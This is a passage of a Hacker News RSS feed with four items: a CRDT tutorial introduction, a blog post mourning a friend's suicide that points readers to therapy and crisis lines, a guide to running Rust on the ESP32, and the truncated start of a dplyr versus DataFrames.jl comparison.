            <guid isPermaLink="false">hacker-news-small-sites-23738004</guid>
            <pubDate>Sun, 05 Jul 2020 11:50:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Introduction to Conflict-Free Replicated Data Types]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23737639">thread link</a>) | @signa11
<br/>
July 5, 2020 | https://lars.hupel.info/topics/crdt/01-intro.html | <a href="https://web.archive.org/web/*/https://lars.hupel.info/topics/crdt/01-intro.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>This is a series about Conflict-Free Replicated Data Types, or CRDTs for short.
Their purpose is to allow seamless replication of data on different nodes in a distributed system.
Merging is by construction always possible, without any conflicts.
This series assumes no knowledge about CRDTs, but be prepared to learn a thing or two about algebras.
All code samples on this page are interactive and executed in your browser.
Understanding the code is necessary for understanding the concepts, so you should be familiar with JavaScript.
If you notice any bugs on this page, <a href="https://github.com/larsrh/website/issues">please let me know</a>!</p><article>
    <p>Dear reader!
If you’re reading this, that’s most likely because you’ve pointed your browser to my website and/or followed a link to this page.
Maybe you’re even reading this from a mobile device!<sup id="fnref:footnote-mobile" role="doc-noteref"><a href="#fn:footnote-mobile">1</a></sup>
Perfect conditions for motivating what all this is about.</p>

<h2 id="contents">Contents</h2>

<ol>
  <li>Preliminaries (this page)</li>
  <li><a href="https://lars.hupel.info/topics/crdt/02-contracts">Algebras &amp; contracts</a></li>
  <li><a href="https://lars.hupel.info/topics/crdt/03-lattices">Lattices</a></li>
  <li><a href="https://lars.hupel.info/topics/crdt/04-combinators">Combinators</a></li>
  <li><a href="https://lars.hupel.info/topics/crdt/05-tombstones">Tombstones</a>
    <ul>
      <li>Side note on <a href="https://lars.hupel.info/topics/crdt/05a-adt">Abstract Data Types</a></li>
    </ul>
  </li>
  <li><a href="https://lars.hupel.info/topics/crdt/06-time">Time</a></li>
  <li><a href="https://lars.hupel.info/topics/crdt/07-deletion">Registers and Deletion</a></li>
  <li>Outlook (to be written)</li>
</ol>

<h2 id="the-web-is-a-truly-distributed-application-platform">The web is a truly distributed application platform</h2>

<p><a href="https://lars.hupel.info/img/topics/crdt/world.jpg" data-toggle="lightbox" data-footer="A network of nodes">
  <img src="https://lars.hupel.info/img/topics/crdt/world.jpg" alt="A network of nodes" data-toggle="tooltip" data-placement="bottom" title="A network of nodes">
</a></p>

<p>That’s right.
When you’re building a web application, you absolutely, positively have to care about the distributed aspect of the web.
(Unless your application is stateless, like my website.)</p>

<p>What does this mean?
You may have a bunch of users.
These users may be manipulating their data from a variety of devices.
Some devices may have a slow Internet connection.
Devices may go offline at any point in time.</p>

<p>Sometimes, application developers punt on this issue:
the mobile app displays “You’re offline” and won’t let you see your data (best case), or silently discard information (worst case).</p>

<p>One particular piece in the puzzle of building distributed applications is to figure out the <em>storage</em>.
Ideally, this storage should be resilient towards users that may become unavailable, concurrent edits, and so on.</p>

<p>Enter <em>Conflict-free Replicated Data Types</em>.
A glorious example of Computer Science naming that actually Makes Sense™, they attempt to provide a flexible solution to the storage problem.
The fundamental idea is this:
You have data.
This data is stored on multiple <em>replicas</em>.
CRDTs describe how to coordinate these replicas to always arrive at a consistent state.</p>

<p>Note that there are two different categories of CRDTs: <em>state-based</em> and <em>op-based</em>.
Both serve the same purpose, but work in different ways and come with their own design trade-offs.
In this series, I’m mostly going to focus on state-based CRDTs.</p>

<h2 id="about-crdts">About CRDTs</h2>

<p><a href="https://lars.hupel.info/img/topics/crdt/cool.webp" data-toggle="lightbox" data-footer="Abed Nadir thinks CRDTs are cool">
  <img src="https://lars.hupel.info/img/topics/crdt/cool.webp" alt="Abed Nadir thinks CRDTs are cool" data-toggle="tooltip" data-placement="bottom" title="Abed Nadir thinks CRDTs are cool">
</a></p>

<p>That’s it!
You now understand the idea behind CRDTs.</p>

<p>Of course, that’s only half the story.
There are at least two sides to understanding CRDTs deeply.</p>

<ol>
  <li>Knowing all the varieties (counters, maps, sets, …) and how they can be embedded in application software.</li>
  <li>Diving into the mathematical background (lattices! partial orderings! wooooooo) powering their implementations.</li>
</ol>

<p>In this series, I want to focus on the second aspect and explain everything that’s needed in a bottom-up fashion using interactive notebooks, diagrams and code notation that’s familiar with a large amount of programmers: JavaScript.
I’ll be employing a few libraries for testing code and visualizing data, but otherwise, there are no further dependencies.
The research papers that describe them often assume a great deal of background knowledge in abstract algebra.
I’ll try to introduce just the necessary knowledge gently.</p>

<p>If however, you want to learn more about their use, this series is not for you.
But fear not: there are tons of resources to check out, e.g. <a href="https://crdt.tech/">crdt.tech</a>.
There’s no tracking on this page so I won’t even notice if you’re gone 🤷</p>

<p>Still here?
Cool. <em>Cool, cool, cool.</em></p>

<p>But before we can strap in and talk about CRDTs, we first need to get some paperwork out of the way.</p>

<h2 id="how-to-work-with-this-document">How to work with this document</h2>

<p>All code snippets here are live: this page functions similarly to Jupyter Notebook.
The main difference is that all code is executed in your browser; there’s no roundtrip to a backend service.
Snippets are evaluated when a page is loaded and can be re-evaluated by clicking the <em>Run</em> button.
Feel free to change any snippet to your liking, but note that subsequent snippets are not automatically re-run.
If you want to reset the session, e.g. because you deleted some code, just reload the page.
Your code is not saved between reloads!</p>

<h2 id="tests">Tests</h2>

<p>This page has a built-in test runner.
It takes named <em>properties</em> that should be checked.
The term <em>property</em> is overloaded in programming, so let me be clear: I’m not talking about properties in an object; instead I’m talking about functions that may take arguments and return a truth value.
In other words, a property is a predicate that should be evaluated on ideally all inputs to see if it always holds.</p>

<p>In the following example, we have two properties, one is valid, the other one isn’t.
They are defined using the <a href="https://github.com/dubzzz/fast-check/">fast-check</a> library, which is available under the <code>fc</code> object.</p>

<div><div><pre><code>checkAll({
  "succeed": fc.property(fc.string(), x =&gt; x == x),
  "fail": fc.property(fc.string(), x =&gt; x != x)
});
</code></pre></div></div>

<p>Under the hood, fast-check automatically generates 100 different inputs.
Granted, 100 different inputs is not exactly <em>all inputs</em>, but since there are infinitely many strings, we can’t exactly do that, can we?
fast-check will call the function (e.g. <code>x =&gt; x == x</code>) with the inputs as specified (<code>fc.string()</code> generates ASCII strings with only printable characters).
If the function ever returns <code>false</code> or throws an exception, the property is marked as failed.
Otherwise, it’s marked as successful.</p>

<p>Fortunately, we can also use <a href="https://www.chaijs.com/">Chai</a> assertions inside our properties to get rich error messages:</p>

<div><div><pre><code>checkAll({
  "succeed": fc.property(fc.string(), x =&gt; assert.equal(x, x)),
  "fail": fc.property(fc.string(), x =&gt; assert.notEqual(x, x))
});
</code></pre></div></div>

<p>The great thing about fast-check is that it will automatically show you the <em>smallest</em> (and hopefully simplest) input it could find where the property failed.
This is called the <em>counterexample</em>.
There could be many counterexamples, but here, we only show one.</p>

<div><div><pre><code>checkAll({
  "strlen": fc.property(fc.string(), x =&gt; assert.isAtMost(x.trim().length, 5))
});
</code></pre></div></div>

<p>You’ll see in the results a failure where the counterexample has length 6 and does not just consist of spaces.</p>

<p>Note that a property could be invalid and we’d still not notice it because fast-check didn’t generate that input for us.
That’s a risk we have to live with.</p>

<h2 id="playground">Playground</h2>

<p>Intrigued?
Why not play around with the test runner a little.
Of course, you could modify the code boxes above, but maybe you were afraid to.
So, I prepared a special playground just for you.
Go wild!</p>

<div><div><pre><code>checkAll({
  "be-creative": null
});
</code></pre></div></div>

<p>Feel free to consult the <a href="https://github.com/dubzzz/fast-check/blob/v1.24.1/documentation/1-Guides/Arbitraries.md">fast-check documentation</a> about which data generators there are.</p>

<h2 id="printing">Printing</h2>

<p>The runner can also print different kinds of outputs, e.g. arrays.
Note that only the last expression in a snippet is printed.</p>

<div><div><pre><code>1 + 1;

[
  "this",
  "is",
  "an",
  "array"
]
</code></pre></div></div>

<p>If you define variables without <code>var</code> (or <code>const</code> or <code>let</code>), they can be accessed in subsequent snippets.
I will use that throughout the series.</p>

<p>We can define different printing for a particular object using the <code>interactiveRender</code> symbol.
It can be declared as a method and will be invoked by the runner automatically:</p>

<div><div><pre><code>class Test {
  constructor(value) {
    this.value = value;
  }

  [interactiveRender]() {
    return `Hi ${this.value}!`;
  }
}

new Test("reader")
</code></pre></div></div>

<h2 id="onwards">Onwards</h2>

<p>You are now ready to proceed with the actual introduction.
<a href="https://lars.hupel.info/topics/crdt/02-contracts">Go here</a> to learn all about contracts.</p>

<h2 id="testimonials">Testimonials</h2>

<p>People on The Internet™ seem to enjoy these posts:</p>

<div><blockquote><p lang="en" dir="ltr">Great read. This is as entertaining as educational.</p>— Julius Adorf (@jeadorf) <a href="https://twitter.com/jeadorf/status/1276235893586702336?ref_src=twsrc%5Etfw">June 25, 2020</a></blockquote>

</div>
<div><blockquote><div lang="en" dir="ltr"><p>GREAT STUFF</p><p>I found this incredibly accessible, as I have at best a shallow grasp of this kind of mathematics.</p><p>I'd only learned about Lattice theory in the last couple of weeks (while searching for partial ordering), and found your article on lattices easy to follow.</p><p>1/(2 V 3)</p></div>— david Kaye (--The "K" stands for Quality) (@dfkaye) <a href="https://twitter.com/dfkaye/status/1279152170869207040?ref_src=twsrc%5Etfw">July 3, 2020</a></blockquote>

</div>

<h2 id="references">References</h2>

<ul>
  <li>Map by TheAndrasBarta on <a href="https://pixabay.com/photos/world-europe-map-connections-1264062/">Pixabay</a></li>
  <li>Abed Nadir on <a href="https://giphy.com/gifs/community-abed-cool-2HONNTJbRhzKE">Giphy</a></li>
</ul>




<hr>

Thanks to the people who've read drafts of this series and provided valuable feedback:
Andrea, Clement Delafargue, Heiko Seeberger, Hillel Wayne, Johannes Link, Matthew Weidner, Princess.

  </article></div>]]>
            </description>
            <link>https://lars.hupel.info/topics/crdt/01-intro.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23737639</guid>
            <pubDate>Sun, 05 Jul 2020 09:58:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Depression Is a Fickle Beast]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23737470">thread link</a>) | @chrschwz
<br/>
July 5, 2020 | https://blog.christianschwarz.com/depression-is-a-fickle-beast | <a href="https://web.archive.org/web/*/https://blog.christianschwarz.com/depression-is-a-fickle-beast">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    

<div>

<p>Today is just an ordinary day like any other. For some, it’s actually a happy occasion, as many are celebrating Independence Day, their birthdays or the simple joys summer has to offer. Others just go about their daily routines without too much of a hassle.</p>
<p>So did I, exactly one month ago today. It’s Tuesday, the fourth of June. I was standing in my kitchen, making lunch and casually responding to some WhatsApp messages while keeping an eye on the stove, so the eggs won’t overcook.</p>
<p>As I was about to close the app, suddenly, a new message appeared at the top of my screen. That’s a pretty lengthy one, I thought, coming from a friend I went to school with and haven’t seen in a year or so.</p>
<hr>
<h2 id="the-moment-of-truth">The Moment Of Truth</h2>
<p>He told me that Paul, a mutual friend within our group of school friends, took his own life a couple of weeks ago, with the funeral taking place in our hometown within the following days.</p>
<blockquote>
<p>And then it just hit me. A gut-wrenching punch went to my heart and through my whole body.</p>
</blockquote>
<p>In that moment, nothing else mattered while I was just blankly staring at the screen of my smartphone. There was this empty and numb feeling inside, or worse — I didn’t feel anything at all, as I struggled to process the unexpected news about his sudden death.</p>
<p>At first, you‘re trying to convince yourself that it’s a blatant joke. That someone lost a stupid bet and didn’t think of anything better than that.</p>
<p>But as the seconds go on, you realize that this one’s real and something irreversible has happened. There’s nothing you can do to prepare yourself for something like this.</p>
<hr>
<h2 id="it-hurts-more-than-everything">It Hurts, More Than Everything</h2>
<p>I can’t imagine how painful it must be for parents to lose their son who was only 22 years old. That has to be a pain like no other.</p>
<blockquote>
<p>No matter how often you face the death of someone close to you, it will always leave a scar on you that you’re gonna live with for the rest of your life.</p>
</blockquote>
<p>Still in shock, I immediately booked a flight to my hometown for the next morning and embarked upon a journey that would take me to my roots, reconnecting with old places, friends and memories.</p>
<p>It also gave me some time to reflect not only on past times and the beauty of life, but also how transient it is.</p>
<hr>
<h2 id="the-days-pass-slowly-but-the-months-fly-by">The Days Pass Slowly, But The Months Fly By</h2>
<p>Yesterday marked a special day. I visited Paul’s grave for the first time after the funeral last month. Although it gives you some comfort that he doesn’t have to go through his pain anymore, it just hurts to know that he’s gone, forever.</p>
<p>I knew that Paul faced major depression for a long time and remember having talked with him about his experiences with psychotherapy from time to time.</p>
<p>He once mentioned that he tried out medications temporarily while seeing the psychiatric clinic more as a way to not having to live back home, so to retain at least some form of independence as a young adult.</p>
<blockquote>
<p>Had I but known in how much pain he must have really been. Most people who never went through something similar just won’t understand.</p>
</blockquote>
<p>Even though I moved a lot and lived in quite a few places during the last couple of years, I dearly wish that I would have checked on him more often.</p>
<p>The last time we saw each other was almost a year ago, when he and another friend of mine came to visit me in my student town. I’ll always cherish these couple of days and memories we had together.</p>
<blockquote>
<p>In the blink of an eye, everything can change. You never know when it’s the last time you see someone in your life.</p>
</blockquote>
<p>Now, going through the last pictures of us together, I just lose it every single time.</p>
<hr>
<h2 id="what-it-really-means-to-be-depressed">What It Really Means To Be Depressed</h2>
<p>The worst thing about depression is actually the part about losing yourself. Trying to understand your own mind without being able to do so and losing interest in what you once loved. It’s torture in its darkest form, really.</p>
<p>As I <a href="https://www.reddit.com/r/AskReddit/comments/a8hg1m/what_is_depression_like_for_you/ecaqo80?utm_source=share&amp;utm_medium=web2x" target="_blank">once read on Reddit</a>:</p>
<blockquote>
<p>You don’t want to live but you don’t want to die. You don’t want to talk to anyone but you feel very lonely. You wake up in the morning and simply wait for the night to come. It’s like trying to laugh at a joke that isn’t funny. Trying to smile for a photo you don’t want to be in. It’s like waking up in the morning and hating that you actually woke up. It feels like someone is just draining the energy out of you every moment you are awake.</p>
</blockquote>
<p>Many people underestimate that part of the self-loathing comes from others as well. Parents making you feel guilty, society giving you the feeling as if you‘ve failed in life because you’re not living up to certain expectations and so forth.</p>
<p>We live in a system that rewards competition and greed — like, if it’s not something that you want to pursue in your life, you’ll somehow feel misplaced. Seeing everyone succeeding in life just keeps you in a downward spiral of doubt.</p>
<p>The real question still remains — what can be done about it?</p>
<hr>
<h2 id="when-youve-fall-down-the-rabbit-hole">When You’ve Fall Down The Rabbit Hole</h2>
<blockquote>
<p><span>„</span>It’s not your fault.“ - Robin Williams in <em>Good Will Hunting</em></p>
</blockquote>
<p>There are days where I have this lingering hope inside — that more people would increase their awareness towards depression and mental health, so both of these psychological issues could be finally treated with the seriousness they really deserve.</p>
<p>It just hurts seeing so many people instantly judging someone in a negative way, taking it lightly or turning a blind eye to the issue as soon as they hear about someone’s depression.</p>
<blockquote>
<p>No matter where and who you are, people still care about you, even if you don’t want to believe it, and life will get better.</p>
</blockquote>
<p>Never ever shy away from starting therapy or calling one of your <a href="https://en.wikipedia.org/wiki/List_of_suicide_crisis_lines" target="_blank">local suicide prevention hotlines</a> if the feeling of inner restlessness overwhelms you. The girls and guys there would love to listen to you!</p>
<p>Having someone to talk to is probably the best thing for you at this moment. Your friends and close ones can help to a certain degree, but there’s just no real substitute for a professional therapist who can guide you the best on your way to bettering yourself.</p>
<p>Meanwhile, you can also give <a href="https://youtu.be/QeYPAh4mxj4" target="_blank">Jordan Peterson’s thoughts on the topic of depression</a> a try. Being a clinical psychologist, he helped a lot of people become better in many ways. Just be warned that it’s quite an emotional video.</p>
<hr>
<h2 id="theres-no-good-in-grief">There’s No Good In Grief</h2>
<p>If you have recently lost someone, first and foremost, I’m so sorry. I wish I could just give you a big hug right now. There are no words to describe the amount of pain that you’re going through.</p>
<p>It certainly took me a while to get myself back together, being able to go on with everyday life as usual. In the first few weeks, I wasn’t able to sleep without seeing Paul in every dream or go a night without crying.</p>
<blockquote>
<p>I really don’t know what I would have done without music, my sister and my closest friends in a time like this. Thank you so much for just being there for me!</p>
</blockquote>
<p>As cliché as it sounds — time really heals all wounds, but only if you let it do so and embrace all of the grieving stages.</p>
<p>I know that it’s hard to accept this, especially if everything is so fresh, and it’s totally okay to feel this way. Even if you feel somehow indifferent, as it initially happened to me, don’t be too harsh with yourself.</p>
<blockquote>
<p>You’re not emotionally cold — it’s just it’s hard to know what to feel at all when suffering from psychological shock. Believe me when I say that there’s nothing wrong with that.</p>
</blockquote>
<p>In hindsight, I’m so glad that I started writing about it, as it really allowed me to express my feelings and helped me cope with the emotional fallout that I’ve experienced.</p>
<p>Occasionally, I still leave Paul a message on WhatsApp, and even though it feels somehow weird, it really helps as a coping mechanism to deal with his loss, too.</p>
<hr>
<h2 id="and-so-it-goes">And So It Goes</h2>
<p>I wonder how grateful I should be for each new day with all its facets, ups and downs. Being able to just be myself, to capture all of the summer breezes, feel the cold of the winter on my skin, hold my loved ones in my arms, enjoy the sparkles of love and live my life to the fullest.</p>
<p>Something Paul will never experience, ever again. How can people within this context even say that life’s too short?</p>
<blockquote>
<p>This one is for you, <em>Paul Marek Kilka</em>. I’m so grateful to have had you in my life and still ask myself — what if I had messaged you a couple more times, just to talk, to tell you that I’m there for you.</p>
</blockquote>
<p>I still ponder on all the why’s and what if’s, but realize that in the end, it isn’t going to bring you back either. Life just goes on.</p>
<p>I’ll always remember you as the humble, laid-back and honest friend that you were to me since the first time I met you back in school.</p>
<p>Goodbye, Paul. Fly on, wherever you may be.</p>
</div>

</div></div>]]>
            </description>
            <link>https://blog.christianschwarz.com/depression-is-a-fickle-beast</link>
            <guid isPermaLink="false">hacker-news-small-sites-23737470</guid>
            <pubDate>Sun, 05 Jul 2020 09:04:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust on the ESP32 (2019)]]>
            </title>
            <description>
<![CDATA[
Score 128 | Comments 42 (<a href="https://news.ycombinator.com/item?id=23737451">thread link</a>) | @lnyan
<br/>
July 5, 2020 | https://mabez.dev/blog/posts/esp32-rust/ | <a href="https://web.archive.org/web/*/https://mabez.dev/blog/posts/esp32-rust/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	  <p>About six months ago, I made a <a href="https://www.reddit.com/r/rust/comments/ar2d3r/espressif_have_finally_released_an_llvm_fork_this/">post on reddit</a> highlighting the launch of Espressif's llvm xtensa fork, not too long after, I had a working <code>rustc</code> toolchain capable of generating xtensa assembly. At this point I had to put this project to the side to finish my final year of university. Funnily enough I didn't stray too far, my final year project used Rust to create a <a href="https://github.com/MWatch">'smartwatch'</a> (I may write about this in the future, if anyone is interested). </p>
<p>Since then I have seen a few posts utilising my fork to run Rust on the <a href="https://www.espressif.com/en/products/hardware/esp32/overview">ESP32</a> (<a href="https://dentrassi.de/2019/06/16/rust-on-the-esp-and-how-to-get-started/">see this great write up</a> by ctron, if you haven't already), most of which are building on top of <a href="https://github.com/espressif/esp-idf">esp-idf</a> which is written in C. In this post I'll be discussing the steps I took to generate valid binaries for the xtensa architecture with <code>rustc</code> and then write some <code>no_std</code> code to build a blinky program for the ESP32 only using Rust!</p>
<h2 id="hacking-the-compiler">Hacking the compiler</h2>
<p>In March of 2019, Espressif released their first run at an <a href="https://github.com/espressif/llvm-xtensa">llvm fork</a> to support the xtensa architecure. Shortly after I got to work bootstrapping Rust to use this newly created fork. Prior to this project, I'd had no experience with the compiler, fortunately I came across the <a href="https://github.com/rust-lang/rust/pull/52787">RISCV PR</a> which gave me a rough idea of what was required. After <em>many</em> build attempts I finally got it working; I was now able to generate xtensa assembly from Rust source code!</p>
<p>The next step was to assemble and link the generated assembly. The llvm fork in it's current state cannot perform object generation, so we must use an external assembler. Luckily Rust allows us to do so by specifying the <code>linker_flavor</code> as <code>gcc</code> and providing a path to the linker with the <code>linker</code> target option, in this case <code>xtensa-esp32-elf-gcc</code>. After that I created a few built-in targets (which you can see <a href="https://github.com/MabezDev/rust-xtensa/blob/ad570c5cb999f62a03156286fdb5d3d1bbd0fb8b/src/librustc_target/spec/xtensa_esp32_none_elf.rs">here</a>); <code>xtensa-esp32-none-elf</code> for the ESP32; <code>xtensa-esp8266-none-elf</code> for the ESP8266; finally the <code>xtensa-unknown-none-elf</code> target for a generic xtensa target.</p>
<h2 id="blinky-code">Blinky code</h2>
<p>Now lets try and get a ESP32 board to blink the onboard LED using just Rust. First off, we need our basic program structure. The <code>xtensa_lx6_rt</code> crate does most of the heavy lifting in this respect, we simply need to define an entry point and the panic handler. Some of this may look vaguely familiar if you have any experience with <code>cortex-m</code> development on Rust, I've tried to mirror the API as best as I can.</p>
<pre><span>#![</span><span>no_std</span><span>]
#![</span><span>no_main</span><span>]


</span><span>use</span><span> xtensa_lx6_rt as _;

</span><span>use </span><span>core::panic::PanicInfo;

</span><span>/// Entry point - called by xtensa_lx6_rt after initialisation
</span><span>#[</span><span>no_mangle</span><span>]
</span><span>fn </span><span>main</span><span>() -&gt; ! {
    </span><span>loop </span><span>{}
}

</span><span>/// Simple panic handler
</span><span>#[</span><span>panic_handler</span><span>]
</span><span>fn </span><span>panic</span><span>(</span><span>_info</span><span>: &amp;PanicInfo) -&gt; ! {
    </span><span>loop </span><span>{}
}
</span></pre>
<p>Now lets add some register definitions for the peripherals we want to use. For our blinky program, we will need to control the GPIO peripheral. In the ESP32 (and most modern processors) peripherals are mapped to memory adresses, commonly refered to as memory mapped peripherals. To control a peripheral we simply need to write values to the right addresses in memory, with respect to the reference manual supplied by the chip manufacturer.</p>
<pre><span>/// GPIO output enable reg
</span><span>const </span><span>GPIO_ENABLE_W1TS_REG</span><span>: </span><span>u32 </span><span>= </span><span>0x3FF44024</span><span>;

</span><span>/// GPIO output set register
</span><span>const </span><span>GPIO_OUT_W1TS_REG</span><span>: </span><span>u32 </span><span>= </span><span>0x3FF44008</span><span>;
</span><span>/// GPIO output clear register
</span><span>const </span><span>GPIO_OUT_W1TC_REG </span><span>: </span><span>u32 </span><span>= </span><span>0x3FF4400C</span><span>;

</span><span>/// The GPIO hooked up to the onboard LED
</span><span>const </span><span>BLINKY_GPIO</span><span>: </span><span>u32 </span><span>= </span><span>2</span><span>;

</span><span>/// GPIO function mode
</span><span>const </span><span>GPIO_FUNCX_OUT_BASE</span><span>: </span><span>u32 </span><span>= </span><span>0x3FF44530</span><span>;
</span><span>const </span><span>GPIO_FUNCX_OUT_SEL_CFG</span><span>: </span><span>u32 </span><span>= </span><span>GPIO_FUNCX_OUT_BASE </span><span>+ (</span><span>BLINKY_GPIO </span><span>* </span><span>4</span><span>);
</span></pre>
<p>Using these definitions it should be possible to change the gpio for your board<sup><a href="#gpio_pin">1</a></sup> by changing the <code>BLINKY_GPIO</code>; for my board (NODEMCU ESP-32S) it was GPIO2.</p>
<h3 id="initialisation">Initialisation</h3>
<p>Next lets setup the pin as a GPIO output. For the ESP32, this is a two step process<sup><a href="#gpio_pin">1</a></sup>. Firstly, its simply a case of setting a bit in the GPIO ouput enable register. Secondly the pin has to be configured in GPIO mode. There are not enough pins for all the possible peripherals in the chip, to combat this each pin can have multiple function modes. In the case of the ESP32, each pin has up to 256 different functions, although not all are mapped. To put the pin in GPIO mode, we need to put in mode 256 (0x100), we do this by writing to the function select register. After issuing those two register writes, we should be able to turn on the GPIO by setting the relevant bit inside the GPIO set register<sup><a href="#2">2</a></sup>.</p>
<pre><span>#[</span><span>no_mangle</span><span>]
</span><span>fn </span><span>main</span><span>() -&gt; ! {

    </span><span>// configure the pin as an output
    </span><span>unsafe </span><span>{
        core::ptr::write_volatile(</span><span>GPIO_ENABLE_W1TS_REG </span><span>as </span><span>*mut </span><span>_, </span><span>0x1 </span><span>&lt;&lt; </span><span>BLINKY_GPIO</span><span>);
        </span><span>// 0x100 makes this pin a simple gpio pin - see the technical reference for more info
        </span><span>core::ptr::write_volatile(</span><span>GPIO_FUNCX_OUT_SEL_CFG </span><span>as </span><span>*mut </span><span>_, </span><span>0x100</span><span>); 
    }
    </span><span>// turn on the LED
    </span><span>unsafe </span><span>{
        core::ptr::write_volatile(</span><span>GPIO_OUT_W1TS_REG </span><span>as </span><span>*mut </span><span>_, </span><span>0x1 </span><span>&lt;&lt; idx);           
    }
    </span><span>loop </span><span>{}
}
</span></pre><h3 id="delaying">Delaying</h3>
<p>For the next stage of our blinky program, we need a way to delay; a simple approach could use <code>for</code> loop like so.</p>
<pre><span>pub fn </span><span>delay</span><span>(</span><span>clocks</span><span>: </span><span>u32</span><span>) {
    </span><span>let</span><span> dummy_var: </span><span>u32 </span><span>= </span><span>0</span><span>;
    </span><span>for </span><span>_ in </span><span>0</span><span>..clocks {
        </span><span>unsafe </span><span>{ core::ptr::read_volatile(&amp;dummy_var) };
    }
}
</span></pre>
<p>We add the volatile read so that the compiler doesn't optimise our delay away. The problem with this approach is that depending of the optimisation level, the number of clock cycles each iteration of the loop changes. We need a cycle accurate way of delaying, fortunately the ESP32 has an internal clock counting register which can be accessed with the read special register <code>rsr</code> instruction. Now are delay function looks like this.</p>
<pre><span>/// cycle accurate delay using the cycle counter register
</span><span>pub fn </span><span>delay</span><span>(</span><span>clocks</span><span>: </span><span>u32</span><span>) {
    </span><span>// NOTE: does not account for rollover
    // ommitted: the asm to read the ccount
    </span><span>let</span><span> target = </span><span>get_ccount</span><span>() + clocks;
    </span><span>loop </span><span>{
        </span><span>if </span><span>get_ccount</span><span>() &gt; target {
            </span><span>break</span><span>;
        }
    }
}
</span></pre>
<p>Now we have cycle accurate counting we can delay for one second by waiting for the number of cycles the processor will do in one second. The default clock speed on most ESP boards is 40mhz, hence waiting for 40 million cycles equates to a one second delay.</p>
<p>Bringing the snippets together and cleaning up the code into functions, we now have <code>main</code> that looks like this.</p>
<pre><span>#[</span><span>no_mangle</span><span>]
</span><span>fn </span><span>main</span><span>() -&gt; ! {
    </span><span>// configure the pin as an output
    </span><span>configure_pin_as_output</span><span>(</span><span>BLINKY_GPIO</span><span>);

    </span><span>loop </span><span>{
        </span><span>set_led</span><span>(</span><span>BLINKY_GPIO</span><span>, </span><span>true</span><span>);
        </span><span>delay</span><span>(</span><span>CORE_HZ</span><span>);
        </span><span>set_led</span><span>(</span><span>BLINKY_GPIO</span><span>, </span><span>false</span><span>);
        </span><span>delay</span><span>(</span><span>CORE_HZ</span><span>);
    }
}
</span></pre>
<p>After flashing to the board, and firing up our JTAG debugger<sup><a href="#1">3</a></sup>, we are greeted with a blinking LED!</p>

<p>The full source can be found in the <a href="https://github.com/MabezDev/xtensa-rust-quickstart">the xtensa quickstart repo</a> if you wish to try it for yourself.</p>
<p>Now I know what most of you are thinking at this point, it's not very Rusty; it contains bundles of unsafe and there are no real abstractions here, and you are right; but it's something to get the ball rolling.</p>
<h2 id="limitations">Limitations</h2>
<p>There are a few small teething issues, but by far the biggest being issue is that the fork struggles with generating debug info; the external assembler does not support <a href="https://sourceware.org/binutils/docs-2.24/as/CFI-directives.html#CFI-directives">CFI directives</a> something that all llvm targets need to support. CFI directives can easily be removed with some preprocessing, but does of course add an extra step. After pushing past that issue, I was still getting relocation linker errors. I opened <a href="https://github.com/espressif/llvm-xtensa/issues/10">an issue</a> to document my findings in the hopes it can be sorted in the next iteration of the llvm fork.</p>
<h2 id="future-work">Future work</h2>
<p>Once the debuginfo issue is sorted, I hope to start developing an ecosystem of HAL's and drivers similar to the <a href="https://github.com/stm32-rs">stm32-rs</a> and <a href="https://github.com/nrf-rs">nrf-rs</a>; I've already started the <a href="https://github.com/esp-rs">esp-rs</a> organization which is where <code>xtensa-lx6-rt</code> currently resides. Espressif has started the upstream process, the first ten patches are now in review, there should be an update coming to their fork moving from the older llvm6 to llvm8 (and hopefully some other additions and fixes too!).</p>
<h2 id="links">Links</h2>
<ul>
<li><a href="https://github.com/MabezDev/xtensa-rust-quickstart">xtensa-quickstart</a> - A quickstart project for using Rust on xtensa</li>
<li><a href="https://github.com/MabezDev/rust-xtensa">rust-xtensa</a> - The xtensa fork of Rust</li>
<li><a href="https://github.com/MabezDev">github</a> - My github</li>
</ul>
<br>
<hr>
<br>




	</div></div>]]>
            </description>
            <link>https://mabez.dev/blog/posts/esp32-rust/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23737451</guid>
            <pubDate>Sun, 05 Jul 2020 09:00:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Comparing (R) dplyr vs. (Julia) DataFrames.jl]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23737449">thread link</a>) | @mindB
<br/>
July 5, 2020 | https://bkamins.github.io/julialang/2020/07/03/dplyr-vs-df.html | <a href="https://web.archive.org/web/*/https://bkamins.github.io/julialang/2020/07/03/dplyr-vs-df.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    

<p>This time the post is inspired by the proposal of <a href="https://github.com/Arkoniak">Andrey Oskin</a>
(thank you for submitting it, below I have adapted business problem description
and <code>dplyr</code> source codes that Andrey provided).</p>

<p>Andrey shared with me typical tasks that he is faced with when doing logs
analysis. To make things concrete, assume that you have a site and you collect
users’ clicks. In the output of this process you get a table with two fields:
time of click (<code>ts</code> column below, measured in seconds) and the user identifier
(<code>user_id</code> column below).</p>

<p>Given such data there are natural business questions, that we can ask, like:</p>

<ol>
  <li>How many sessions an average user has?</li>
  <li>How many users have exactly two sessions?</li>
  <li>Find top 10 users, ordered by the descending number of sessions?</li>
  <li>What is the average time between sessions start?</li>
</ol>

<p>Session in these questions is a more or less arbitrary thing, usually,
it has a meaning of sequence of events that come together as there is
a short time difference between consecutive events. In the examples we
assume that if a user has not clicked on our site for 900 seconds after the last
click the session is over.</p>

<p>What I do in this post is take a toy data set that has this structure and
<code>dplyr</code> codes that Andrey shared with me that answer the business questions
presented above and rewrite them to DataFrames.jl.</p>

<p>The objective of this post is to compare the syntaxes of <code>dplyr</code> and
